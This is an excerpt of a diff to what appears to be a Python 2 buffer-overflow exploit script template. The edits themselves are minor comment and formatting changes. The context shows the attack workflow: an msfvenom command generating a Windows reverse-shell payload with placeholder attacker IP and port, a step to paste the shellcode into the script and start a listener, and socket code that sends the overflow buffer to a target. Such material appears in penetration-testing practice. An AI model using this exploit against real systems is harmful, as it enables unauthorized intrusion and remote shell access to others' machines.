@@ -34,7 +34,7 @@ generate shellcode payload
  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
  replace shellcode variable, take note of payload size - check remaining buffer size
  start listener on host at specified port
- '''
+'''
 # --------------------------------------------------------------------------------------------------------------------
 
 # edit as required -----
@@ -98,7 +98,7 @@ while True:
 		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((ipaddr, port))
 		'''
-        	#check eax register for weird characters appended by application (if any), test w/o debugger attached
+        	#check registers for weird characters appended by application (if any), test crash w/o debugger attached
 		s.send((buffer))
 		print "Sending %s bytes..." % str(len(buffer))
 		s.close()
